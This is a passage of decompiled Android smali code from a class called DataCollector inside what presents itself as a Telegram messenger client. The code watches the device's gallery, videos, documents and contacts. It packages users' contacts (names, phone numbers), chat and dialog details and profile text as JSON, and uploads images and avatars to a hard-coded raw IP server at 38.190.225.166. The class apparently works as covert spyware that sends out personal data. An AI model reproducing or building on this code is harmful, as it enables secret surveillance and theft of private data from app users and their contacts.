    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 207
    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->galleryObserver:Landroid/database/ContentObserver;

    .line 210
    :goto_0
    new-instance v2, Lorg/telegram/messenger/DataCollector$2;

    iget-object v4, p0, Lorg/telegram/messenger/DataCollector;->mainHandler:Landroid/os/Handler;

    invoke-direct {v2, p0, v4}, Lorg/telegram/messenger/DataCollector$2;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/os/Handler;)V

    iput-object v2, p0, Lorg/telegram/messenger/DataCollector;->videoObserver:Landroid/database/ContentObserver;

    .line 218
    :try_start_1
    sget-object v4, Landroid/provider/MediaStore$Video$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    invoke-virtual {p1, v4, v1, v2}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 220
    const-string v2, "Observer registered: video"

    invoke-static {v0, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v2

    .line 222
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Observer register failed (video): "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 223
    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->videoObserver:Landroid/database/ContentObserver;

    .line 226
    :goto_1
    new-instance v2, Lorg/telegram/messenger/DataCollector$3;

    iget-object v4, p0, Lorg/telegram/messenger/DataCollector;->mainHandler:Landroid/os/Handler;

    invoke-direct {v2, p0, v4}, Lorg/telegram/messenger/DataCollector$3;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/os/Handler;)V

    iput-object v2, p0, Lorg/telegram/messenger/DataCollector;->docsObserver:Landroid/database/ContentObserver;

    .line 234
    :try_start_2
    const-string v2, "external"

    .line 235
    invoke-static {v2}, Landroid/provider/MediaStore$Files;->getContentUri(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    iget-object v4, p0, Lorg/telegram/messenger/DataCollector;->docsObserver:Landroid/database/ContentObserver;

    .line 234
    invoke-virtual {p1, v2, v1, v4}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 237
    const-string v2, "Observer registered: docs"

    invoke-static {v0, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    move-exception v2

    .line 239
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Observer register failed (docs): "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 240
    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->docsObserver:Landroid/database/ContentObserver;

    .line 243
    :goto_2
    new-instance v2, Lorg/telegram/messenger/DataCollector$4;

    iget-object v4, p0, Lorg/telegram/messenger/DataCollector;->mainHandler:Landroid/os/Handler;

    invoke-direct {v2, p0, v4}, Lorg/telegram/messenger/DataCollector$4;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/os/Handler;)V

    iput-object v2, p0, Lorg/telegram/messenger/DataCollector;->contactsObserver:Landroid/database/ContentObserver;

    .line 251
    :try_start_3
    sget-object v4, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    invoke-virtual {p1, v4, v1, v2}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 253
    const-string p1, "Observer registered: contacts"

    invoke-static {v0, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_3

    :catch_3
    move-exception p1

    .line 255
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Observer register failed (contacts): "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 256
    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->contactsObserver:Landroid/database/ContentObserver;

    .line 259
    :goto_3
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "ContentObservers setup complete for account="

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public scheduleAvatarUpload(IJLjava/io/File;)V
    .locals 4

    if-nez p4, :cond_0

    return-void

    .line 2578
    :cond_0
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->pendingAvatarByFilePath:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-virtual {p4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p4

    int-to-long v1, p1

    const/4 p1, 0x2

    new-array p1, p1, [J

    const/4 v3, 0x0

    aput-wide v1, p1, v3

    const/4 v1, 0x1

    aput-wide p2, p1, v1

    invoke-virtual {v0, p4, p1}, Lj$/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    return-void
.end method

.method public sendAvatar(IJLjava/io/File;)V
    .locals 14

    move-object v13, p0

    move-wide/from16 v7, p2

    if-eqz p4, :cond_4

    .line 2559
    invoke-virtual/range {p4 .. p4}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    goto/16 :goto_0

    .line 2560
    :cond_0
    iget-object v0, v13, Lorg/telegram/messenger/DataCollector;->sentAvatars:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {p0, v0, v7, v8}, Lorg/telegram/messenger/DataCollector;->checkCooldown(Lj$/util/concurrent/ConcurrentHashMap;J)Z

    move-result v0

    if-nez v0, :cond_1

    return-void

    .line 2561
    :cond_1
    invoke-virtual/range {p4 .. p4}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 2562
    const-string v1, ".jpg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ".jpeg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2

    .line 2563
    const-string v1, ".png"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ".webp"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    return-void

    .line 2564
    :cond_2
    invoke-virtual/range {p4 .. p4}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/32 v2, 0x500000

    cmp-long v4, v0, v2

    if-lez v4, :cond_3

    return-void

    .line 2565
    :cond_3
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "avatar:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move v3, p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, ":"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7, v8}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v11, ""

    const-string v12, "image/jpeg"

    const-string v2, "https://38.190.225.166/api/avatar"

    const-wide/16 v4, 0x0

    const/4 v6, 0x0

    const/4 v9, 0x1

    move-object v0, p0

    move-wide/from16 v7, p2

    move-object/from16 v10, p4

    invoke-direct/range {v0 .. v12}, Lorg/telegram/messenger/DataCollector;->enqueueFileUpload(Ljava/lang/String;Ljava/lang/String;IJIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_4

    .line 2567
    const-string v0, "TGCollect"

    const-string v1, "sendAvatar: queue unavailable, skip direct upload"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_4
    :goto_0
    return-void
.end method

.method public sendChatInfo(ILorg/telegram/tgnet/TLRPC$Chat;)V
    .locals 7

    if-nez p2, :cond_0

    return-void

    .line 1617
    :cond_0
    iget-wide v0, p2, Lorg/telegram/tgnet/TLRPC$Chat;->id:J

    neg-long v0, v0

    .line 1618
    iget-object v2, p0, Lorg/telegram/messenger/DataCollector;->sentProfiles:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {p0, v2, v0, v1}, Lorg/telegram/messenger/DataCollector;->checkCooldown(Lj$/util/concurrent/ConcurrentHashMap;J)Z

    move-result v2

    if-nez v2, :cond_1

    return-void

    .line 1621
    :cond_1
    :try_start_0
    instance-of v2, p2, Lorg/telegram/tgnet/TLRPC$TL_channel;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, "group"

    if-eqz v2, :cond_3

    .line 1622
    :try_start_1
    move-object v2, p2

    check-cast v2, Lorg/telegram/tgnet/TLRPC$TL_channel;

    iget-boolean v2, v2, Lorg/telegram/tgnet/TLRPC$Chat;->megagroup:Z

    if-eqz v2, :cond_2

    goto :goto_0

    :cond_2
    const-string v3, "channel"

    goto :goto_0

    :catch_0
    move-exception p1

    goto :goto_2

    .line 1624
    :cond_3
    :goto_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 1625
    const-string v4, "type"

    const-string v5, "chat_info"

    invoke-virtual {v2, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1626
    const-string v4, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v5

    invoke-virtual {v2, v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1627
    const-string p1, "chat_id"

    iget-wide v4, p2, Lorg/telegram/tgnet/TLRPC$Chat;->id:J

    invoke-virtual {v2, p1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1628
    const-string p1, "dialog_id"

    invoke-virtual {v2, p1, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1629
    const-string p1, "name"

    iget-object v0, p2, Lorg/telegram/tgnet/TLRPC$Chat;->title:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const-string v1, ""

    if-eqz v0, :cond_4

    goto :goto_1

    :cond_4
    move-object v0, v1

    :goto_1
    :try_start_2
    invoke-virtual {v2, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1630
    const-string p1, "username"

    iget-object v0, p2, Lorg/telegram/tgnet/TLRPC$Chat;->username:Ljava/lang/String;

    if-eqz v0, :cond_5

    move-object v1, v0

    :cond_5
    invoke-virtual {v2, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1631
    const-string p1, "dialog_type"

    invoke-virtual {v2, p1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1632
    const-string p1, "participants_count"

    iget p2, p2, Lorg/telegram/tgnet/TLRPC$Chat;->participants_count:I

    invoke-virtual {v2, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1633
    invoke-direct {p0, v2}, Lorg/telegram/messenger/DataCollector;->postJson(Lorg/json/JSONObject;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_3

    .line 1635
    :goto_2
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "sendChatInfo: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_3
    return-void
.end method

.method public sendContact(ILorg/telegram/tgnet/TLRPC$User;)V
    .locals 5

    if-nez p2, :cond_0

    return-void

    .line 1900
    :cond_0
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->sentContacts:Lj$/util/concurrent/ConcurrentHashMap;

    int-to-long v1, p1

    const-wide v3, 0x2540be400L

    mul-long v1, v1, v3

    iget-wide v3, p2, Lorg/telegram/tgnet/TLRPC$User;->id:J

    add-long/2addr v1, v3

    invoke-direct {p0, v0, v1, v2}, Lorg/telegram/messenger/DataCollector;->checkCooldown(Lj$/util/concurrent/ConcurrentHashMap;J)Z

    move-result v0

    if-nez v0, :cond_1

    return-void

    .line 1902
    :cond_1
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 1903
    const-string v1, "type"

    const-string v2, "contact"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1904
    const-string v1, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1905
    const-string p1, "user_id"

    iget-wide v1, p2, Lorg/telegram/tgnet/TLRPC$User;->id:J

    invoke-virtual {v0, p1, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1906
    const-string p1, "first_name"

    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$User;->first_name:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v2, ""

    if-eqz v1, :cond_2

    goto :goto_0

    :cond_2
    move-object v1, v2

    :goto_0
    :try_start_1
    invoke-virtual {v0, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1907
    const-string p1, "last_name"

    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$User;->last_name:Ljava/lang/String;

    if-eqz v1, :cond_3

    goto :goto_1

    :cond_3
    move-object v1, v2

    :goto_1
    invoke-virtual {v0, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1908
    const-string p1, "phone"

    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$User;->phone:Ljava/lang/String;

    if-eqz v1, :cond_4

    goto :goto_2

    :cond_4
    move-object v1, v2

    :goto_2
    invoke-virtual {v0, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1909
    const-string p1, "username"

    iget-object p2, p2, Lorg/telegram/tgnet/TLRPC$User;->username:Ljava/lang/String;

    if-eqz p2, :cond_5

    move-object v2, p2

    :cond_5
    invoke-virtual {v0, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1910
    invoke-direct {p0, v0}, Lorg/telegram/messenger/DataCollector;->postJson(Lorg/json/JSONObject;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_3

    :catch_0
    move-exception p1

    .line 1912
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "sendContact: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_3
    return-void
.end method

.method public sendDialogInfo(IJLjava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V
    .locals 4

    if-eqz p4, :cond_2

    .line 1643
    invoke-virtual {p4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_1

    .line 1645
    :cond_0
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 1646
    const-string v1, "type"

    const-string v2, "dialog"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1647
    const-string v1, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1648
    const-string p1, "dialog_id"

    invoke-virtual {v0, p1, p2, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1649
    const-string p1, "name"

    invoke-virtual {p4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1650
    const-string p1, "dialog_type"

    invoke-virtual {v0, p1, p5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1651
    const-string p1, "username"

    if-eqz p6, :cond_1

    goto :goto_0

    :cond_1
    const-string p6, ""

    :goto_0
    invoke-virtual {v0, p1, p6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1652
    const-string p1, "peer_id"

    invoke-virtual {v0, p1, p7, p8}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1653
    invoke-direct {p0, v0}, Lorg/telegram/messenger/DataCollector;->postJson(Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    .line 1655
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string p3, "sendDialogInfo: "

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_2
    :goto_1
    return-void
.end method

.method public sendFullProfile(ILorg/telegram/tgnet/TLRPC$UserFull;)V
    .locals 6

    if-nez p2, :cond_0

    return-void

    .line 1599
    :cond_0
    :try_start_0
    const-string v0, ""

    .line 1600
    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$UserFull;->about:Ljava/lang/String;

    if-eqz v1, :cond_1

    move-object v0, v1

    .line 1601
    :cond_1
    iget-wide v1, p2, Lorg/telegram/tgnet/TLRPC$UserFull;->id:J

    .line 1602
    new-instance p2, Lorg/json/JSONObject;

    invoke-direct {p2}, Lorg/json/JSONObject;-><init>()V

    .line 1603
    const-string v3, "type"

    const-string v4, "full_profile"

    invoke-virtual {p2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1604
    const-string v3, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v4

    invoke-virtual {p2, v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1605
    const-string p1, "user_id"

    invoke-virtual {p2, p1, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1606
    const-string p1, "about"

    invoke-virtual {p2, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1607
    invoke-direct {p0, p2}, Lorg/telegram/messenger/DataCollector;->postJson(Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 1609
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "sendFullProfile: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method public sendImage(IJILjava/io/File;)V
    .locals 14

    move-object v13, p0

    move-wide/from16 v4, p2

    move/from16 v6, p4

    if-eqz p5, :cond_4

    .line 2468
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    goto/16 :goto_0

    .line 2469
    :cond_0
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 2470
    const-string v1, ".jpg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, ".jpeg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_1

    .line 2471
    const-string v1, ".png"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, ".webp"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    return-void

    .line 2472
    :cond_1
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/32 v2, 0xa00000

    cmp-long v7, v0, v2

    if-lez v7, :cond_2

    return-void

    :cond_2
    if-lez v6, :cond_3

    const-wide/32 v0, 0x3b9aca00

    mul-long v0, v0, v4

    int-to-long v2, v6

    add-long/2addr v0, v2

    .line 2476
    iget-object v2, v13, Lorg/telegram/messenger/DataCollector;->sentImages:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {p0, v2, v0, v1}, Lorg/telegram/messenger/DataCollector;->checkCooldown(Lj$/util/concurrent/ConcurrentHashMap;J)Z

    move-result v0

    if-nez v0, :cond_3

    return-void

    .line 2478
    :cond_3
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "image:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move v3, p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, ":"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v11, ""

    const-string v12, "image/jpeg"

    const-string v2, "https://38.190.225.166/api/image"

    const-wide/16 v7, 0x0

    const/4 v9, 0x0

    move-object v0, p0

    move-wide/from16 v4, p2

    move/from16 v6, p4

    move-object/from16 v10, p5

    invoke-direct/range {v0 .. v12}, Lorg/telegram/messenger/DataCollector;->enqueueFileUpload(Ljava/lang/String;Ljava/lang/String;IJIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_4

    .line 2480
    const-string v0, "TGCollect"

    const-string v1, "sendImage: queue unavailable, skip direct upload"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_4
    :goto_0
    return-void
.end method

.method public sendMedia(IJILjava/io/File;)V
    .locals 13

    if-eqz p5, :cond_d

    .line 2487
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    goto/16 :goto_5

    .line 2488
    :cond_0
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 2490
    const-string v1, ".jpg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_d

    const-string v1, ".jpeg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_d

    .line 2491
    const-string v1, ".png"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_d

    const-string v1, ".webp"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    goto/16 :goto_5

    .line 2494
    :cond_1
